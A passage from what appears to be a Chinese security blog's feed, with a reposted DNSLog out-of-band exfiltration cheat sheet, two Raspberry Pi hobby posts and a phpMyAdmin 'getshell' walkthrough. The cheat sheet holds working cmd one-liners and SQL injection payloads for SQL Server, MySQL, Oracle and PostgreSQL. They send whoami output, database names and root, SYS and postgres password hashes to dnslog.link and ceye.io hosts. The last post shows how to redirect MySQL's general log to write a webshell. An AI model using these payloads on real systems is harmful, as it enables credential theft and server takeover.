<span class="built_in">ping</span> -n <span class="number">1</span> %i.xxx.dnslog.link</div><div class="line">获取用户名：<span class="keyword">for</span> /F "delims=\ tokens=<span class="number">2</span>" %i <span class="keyword">in</span> ('whoami') <span class="keyword">do</span> <span class="built_in">ping</span> -n <span class="number">1</span> %i.xxx.dnslog.link</div><div class="line"> </div><div class="line">不能编码输出，但利用powershell可以实现；</div><div class="line"> </div><div class="line"><span class="built_in">dir</span>有/b参数，不显示修改日期等信息，只显示文件名，所以可以弹出；</div><div class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> ('<span class="built_in">dir</span> /b C:\') <span class="keyword">do</span> <span class="built_in">start</span> http://xxx.dnslog.link/[%x].jpg</div></pre></td></tr></table></figure></p><h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><p>在SqlServer中没有回显时 需要时间盲注或者布尔盲注的时候。可以考虑使用dnslog的方法去获取数据</p><p>获取当前数据库名称<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),db_name())+<span class="string">'.xxxxxxxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');<span class="comment">--</span></div><div class="line"></div><div class="line">注：db_name()  db_name(1)  db_name(2)…… 可以依次显示数据库</div></pre></td></tr></table></figure></p><p>获取当前数据库的表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">SELECT</span> @host=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span>)+<span class="string">'.xxxxxxxxxx.ceye.io'</span>;EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');<span class="comment">--</span></div></pre></td></tr></table></figure></p><p>获取更多表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'trace_xe_action_map'</span>)</div><div class="line"><span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'trace_xe_action_map'</span>,<span class="string">'trace_xe_event_map'</span>)</div><div class="line">......</div></pre></td></tr></table></figure></p><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.mysql.ip.port.b182oj.ceye.io\\abc'</span>));</div></pre></td></tr></table></figure><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> UTL_INADDR.GET_HOST_ADDRESS(<span class="string">'ip.port.b182oj.ceye.io'</span>);</div><div class="line"><span class="keyword">SELECT</span> UTL_HTTP.REQUEST(<span class="string">'http://ip.port.b182oj.ceye.io/oracle'</span>) <span class="keyword">FROM</span> DUAL;</div><div class="line"><span class="keyword">SELECT</span> HTTPURITYPE(<span class="string">'http://ip.port.b182oj.ceye.io/oracle'</span>).GETCLOB() <span class="keyword">FROM</span> DUAL;</div><div class="line"><span class="keyword">SELECT</span> DBMS_LDAP.INIT((<span class="string">'oracle.ip.port.b182oj.ceye.io'</span>,<span class="number">80</span>) <span class="keyword">FROM</span> DUAL;</div><div class="line"><span class="keyword">SELECT</span> DBMS_LDAP.INIT((<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> SYS.USER$ <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'SYS'</span>)||<span class="string">'.ip.port.b182oj.ceye.io'</span>,<span class="number">80</span>) <span class="keyword">FROM</span> DUAL;</div></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> table_output;</div><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_output(<span class="keyword">content</span> <span class="built_in">text</span>);</div><div class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> temp_function()</div><div class="line"><span class="keyword">RETURNS</span> <span class="built_in">VOID</span> <span class="keyword">AS</span> $$</div><div class="line"><span class="keyword">DECLARE</span> exec_cmd <span class="built_in">TEXT</span>;</div><div class="line"><span class="keyword">DECLARE</span> query_result <span class="built_in">TEXT</span>;</div><div class="line"><span class="keyword">BEGIN</span></div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">INTO</span> query_result (<span class="keyword">SELECT</span> passwd</div><div class="line"><span class="keyword">FROM</span> pg_shadow <span class="keyword">WHERE</span> usename=<span class="string">'postgres'</span>);</div><div class="line">exec_cmd := E'COPY table_output(content)</div><div class="line">FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';</div><div class="line"><span class="keyword">EXECUTE</span> exec_cmd;</div><div class="line"><span class="keyword">END</span>;</div><div class="line">$$ LANGUAGE plpgsql SECURITY DEFINER;</div><div class="line"><span class="keyword">SELECT</span> temp_function();</div></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bodkin.ren/?p=790" target="_blank" rel="external">https://www.bodkin.ren/?p=790</a></p><p><a href="https://www.t00ls.net/viewthread.php?tid=40795&amp;highlight=dns" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=40795&amp;highlight=dns</a></p><p><a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从其他地方看到，转载并总结下，记录下来以后可能会用到&lt;br&gt;
    
    </summary>
    
      <category term="SQL-Mark" scheme="https://isky0t.github.io/categories/SQL-Mark/"/>
    
    
      <category term="SQL" scheme="https://isky0t.github.io/tags/SQL/"/>
    
      <category term="tools" scheme="https://isky0t.github.io/tags/tools/"/>
    
      <category term="reprint" scheme="https://isky0t.github.io/tags/reprint/"/>
    
  </entry>
  
  <entry>
    <title>raspberrypi-web远程控制空调</title>
    <link href="https://isky0t.github.io/2017/05/04/raspberrypi-web%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A9%BA%E8%B0%83/"/>
    <id>https://isky0t.github.io/2017/05/04/raspberrypi-web远程控制空调/</id>
    <published>2017-05-04T03:11:08.000Z</published>
    <updated>2017-10-13T03:30:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>基于树莓派-web远程控制空调，有点智能家居的味道  ，既然答辩已经结束 那就写篇文章记录下<br><a id="more"></a><br>但是，由于其他原因 。源码不能直接分享各位小伙伴，不好意思了，如果有意，可以来找我交流下</p><p><img src="/images/raspberrypi05.png" alt="raspberrypi05"><br><img src="/images/raspberrypi04.png" alt="raspberrypi05"></p><p>上面两幅图分别是  树莓派 和web页面 （代码纯原创 ，估计这么渣的代码也找不到第二个了）</p><p><img src="/images/raspberrypi06.png" alt="raspberrypi05"></p><p>我流程图画成这样 应该不用过多解释了吧  </p><p>接下来我们来看看</p><h2 id="红外遥控的原理"><a href="#红外遥控的原理" class="headerlink" title="红外遥控的原理"></a>红外遥控的原理</h2><blockquote><p>1.红外遥控原理 红外遥控器是利用一个红外发射管，以红外光为载体来将按键信息传递给接收端的设备。红外遥控系统主要分为调制、发射 和接收三部分</p></blockquote><p><strong>调制：</strong>为了免受其他信号的干扰 通常会调制在特定的载波频率上 ，在此发送红外信号的二进制脉冲码</p><p><strong>发射：</strong>发射的是一串二进制的脉冲码 如何分辨 0 和 1 呢 这就是PWM脉冲宽度编码 根据脉冲宽度来区别</p><p><img src="/images/raspberrypi07.png" alt="raspberrypi05"></p><p>这里我说明下 并不是所有脉冲编码都是一样的   这次我控制的美的空调中的就是这样</p><p>0.54ms低电平 0.54高电平代表 0</p><p>0.54ms低电平 1.62ms高电平代表1</p><p>然后紧接着来看下空调的编码</p><p><img src="/images/raspberrypi08.png" alt="raspberrypi05"></p><p>经过我自己测试，然后翻阅了资料发现我这次控制的空调 编码如下，当然 还有定时开、关机 更复杂的编码 我没有去管他。。这个主要就是这样，我感觉够用了，远程开关空调，我感觉定时功能 就是多余的了，你说呢？？？</p><p><img src="/images/raspberrypi09.png" alt="raspberrypi05"></p><p>紧接着 把0和1替换成 波形</p><p><img src="/images/raspberrypi10.png" alt="raspberrypi05"></p><p><strong>注意下 最后还要加一个结束码 540  就是0.54ms</strong></p><p>然后利用，红外数据发送的程序，将他发送出去  （由于我硬件太白痴 所以我使用了lirc）</p><p>lirc 的灵活使用  将配置文件中的 KEY 改成我们的raw码，（这里要说下，KEY取的名字，并不局限于namespace中的，我自己试了，其实都可以取！！） 具体怎么使用lirc，百度下吧，教程很多，不过很多都是重复copy的！！这里要说下有个特别要注意的地方，raw码中间的空格要替换成5个，否则配置文件就会显示错误！！</p><p>最后可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">irsend SEND_ONCE /home/pi/lircd.conf KEY_POWER</div></pre></td></tr></table></figure></p><p>ircd.conf是配置命名 KEY_POWER是键名  自己灵活运用 </p><p><em>这里要说明下 为啥空调只能通过发送raw码的方式 因为空调是状态码！！</em></p><h2 id="web原理"><a href="#web原理" class="headerlink" title="web原理"></a>web原理</h2><p>1.web服务器搭建在树莓派 上 ，然后运用上个帖子介绍的frp内网穿透的办法  将web网站 开放到外网上 ，同时使用里了里面的 一个认证访问的设置  输入用户名和密码 才可以访问到反向代理的页面 </p><p>2.这边我并没有用到MySQL数据库  直接利用的php脚本去执行的树莓派的终端命令 令它运行发送红外数据的命令,一开始我还以为速度会有点慢 没想到几乎没有差别</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基于树莓派-web远程控制空调，有点智能家居的味道  ，既然答辩已经结束 那就写篇文章记录下&lt;br&gt;
    
    </summary>
    
      <category term="raspberrypi" scheme="https://isky0t.github.io/categories/raspberrypi/"/>
    
    
      <category term="raspberrypi" scheme="https://isky0t.github.io/tags/raspberrypi/"/>
    
      <category term="瞎折腾" scheme="https://isky0t.github.io/tags/%E7%9E%8E%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>raspberrypi内网穿透</title>
    <link href="https://isky0t.github.io/2017/04/30/raspberrypi%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <id>https://isky0t.github.io/2017/04/30/raspberrypi内网穿透/</id>
    <published>2017-04-30T02:28:28.000Z</published>
    <updated>2017-10-13T03:09:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用的是frp让树莓派内网穿透，顺便记录下<br><a id="more"></a><br>主要尝试过了几种工具，然后选择了frp </p><p>nat123 速度极慢 还有限制 还有套路 真的很套路</p><p>花生壳 免费版内网穿透只限电信网</p><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><blockquote><p>GitHub地址：<a href="https://github.com/fatedier/frp" target="_blank" rel="external">https://github.com/fatedier/frp</a></p></blockquote><p>这里注意 要下载对应版本 ，我树莓派使用的官方的系统 应该要下载 <a href="https://github.com/fatedier/frp/releases/download/v0.9.3/frp_0.9.3_linux_arm.tar.gz" target="_blank" rel="external">https://github.com/fatedier/frp/releases/download/v0.9.3/frp_0.9.3_linux_arm.tar.gz</a> 否则配置完就编译不成功</p><h2 id="通过自定义域名访问部署于内网的-web-服务"><a href="#通过自定义域名访问部署于内网的-web-服务" class="headerlink" title="通过自定义域名访问部署于内网的 web 服务"></a>通过自定义域名访问部署于内网的 web 服务</h2><blockquote><p>有时想要让其他人通过域名访问或者测试我们在本地搭建的 web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。</p></blockquote><p>1.修改 frps.ini 文件，配置一个名为 web 的 http 反向代理，设置 http 访问端口为 8080，绑定自定义域名www.yourdomain.com:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># frps.ini</div><div class="line">[common]</div><div class="line">bind_port = 7000</div><div class="line">vhost_http_port = 8080</div><div class="line"></div><div class="line">[web]</div><div class="line">type = http</div><div class="line">custom_domains = www.yourdomain.com</div><div class="line">auth_token = 123</div></pre></td></tr></table></figure></p><p>2.启动 frps<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./frps -c ./frps.ini</div></pre></td></tr></table></figure></p><p><img src="/images/raspberrypi01.png" alt="frp"></p><p>3.修改 frpc.ini 文件，设置 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 web 服务对应的端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># frpc.ini</div><div class="line">[common]</div><div class="line">server_addr = x.x.x.x</div><div class="line">server_port = 7000</div><div class="line">auth_token = 123</div><div class="line"></div><div class="line">[web]</div><div class="line">type = http</div><div class="line">local_port = 80</div></pre></td></tr></table></figure></p><p>4.启动 frpc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./frpc -c ./frpc.ini</div></pre></td></tr></table></figure></p><p>5.将 www.yourdomain.com 的域名 A 记录解析到 IP x.x.x.x，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名</p><p>6.通过浏览器访问 <a href="http://www.yourdomain.com:8080" target="_blank" rel="external">http://www.yourdomain.com:8080</a> 即可访问到处于内网机器上的 web 服务。</p><p><img src="/images/raspberrypi02.png" alt="raspberrypi02"></p><p>这里我就以内网web服务器为例 其他的服务 也可以 自己去看文档吧</p><p>我树莓派上Apache已经可以在公网访问了  来看下我这些天的功劳<br><img src="/images/raspberrypi03.png" alt="raspberrypi02"><br><img src="/images/raspberrypi04.png" alt="raspberrypi02"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用的是frp让树莓派内网穿透，顺便记录下&lt;br&gt;
    
    </summary>
    
      <category term="raspberrypi" scheme="https://isky0t.github.io/categories/raspberrypi/"/>
    
    
      <category term="raspberrypi" scheme="https://isky0t.github.io/tags/raspberrypi/"/>
    
      <category term="瞎折腾" scheme="https://isky0t.github.io/tags/%E7%9E%8E%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin-log-getshell</title>
    <link href="https://isky0t.github.io/2017/03/17/phpmyadmin-log-getshell/"/>
    <id>https://isky0t.github.io/2017/03/17/phpmyadmin-log-getshell/</id>
    <published>2017-03-17T03:33:57.000Z</published>
    <updated>2017-10-13T03:47:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>前几天接地气发在群里 ，我一直没自己测试 ，今天正好有空， 来自己本地测试下！<br><a id="more"></a><br>首先说明，思路或者说手法出自<a href="https://www.webshell.cc/6433.html" target="_blank" rel="external">https://www.webshell.cc/6433.html</a></p><blockquote><p>环境：php5.4+Apache+MySQL5.5.53（phpstudy套装）</p><p>OS：win2003 </p><p>权限：root</p></blockquote><p>首先来看下，平时root权限下比较烦的一点 ，就是 <code>secure-file-priv</code> 参数</p><blockquote><p><code>secure-file-priv</code>参数是用来限制 <code>LOAD DATA, SELECT … OUTFILE , and LOAD_FILE()</code> 传到哪个指定目录的。</p><p>当 <code>secure_file_priv</code> 的值为null ，表示限制mysqld 不允许导入、导出<br>当 <code>secure_file_priv</code> 的值为/tmp/ ，表示限制mysqld 的导入、导出只能发生在/tmp/目录下<br>当 <code>secure_file_priv</code> 的值没有具体值时，表示不对mysqld 的导入、导出做限制</p></blockquote><p><img src="/images/phpmyadmin01.png" alt="phpmyadmin01"></p><p>此时我虚拟机中 <code>secure_file_priv</code> 的值为null，所以我也很绝望啊 我能怎么办？</p><p>所以接下来有了这个新姿势</p><p>是关于全局变量 <code>general  log</code></p><p><img src="/images/phpmyadmin02.png" alt="phpmyadmin01"></p><p>打开 general log 后，所有的查询语句都会记录在 general log 文件，文件为只读方式，但这样general log文件会非常大，所以默认是关闭的。</p><p>于是 我们要利用这个特性 让sql查询语句去记录在我们想要记录的文件中</p><p>我们先编辑它 把OFF状态改成ON 并把 general log file 路径改成我们的shell路径</p><p><img src="/images/phpmyadmin03.png" alt="phpmyadmin01"></p><p>general log file这个路径的文件 如果不存在 MySQL会自己创建 内容是我们最后执行的一次SQL查询    那就达到了我们的目的<br><img src="/images/phpmyadmin04.png" alt="phpmyadmin01"></p><p>看下虚拟中的shell文件内容 就是我们查询的SQL语句记录</p><p><img src="/images/phpmyadmin05.png" alt="phpmyadmin01"></p><p>菜刀成功连接</p><p><img src="/images/phpmyadmin06.png" alt="phpmyadmin01"></p><p><em>shell.php 是在你更改完general log file路径时就马上创建</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天接地气发在群里 ，我一直没自己测试 ，今天正好有空， 来自己本地测试下！&lt;br&gt;
    
    </summary>
    
      <category term="getshell" scheme="https://isky0t.github.io/categories/getshell/"/>
    
    
      <category term="getshell" scheme="https://isky0t.github.io/tags/getshell/"/>
    
      <category term="mysql" scheme="https://isky0t.github.io/tags/mysql/"/>
    
  </entry>
  
</feed>
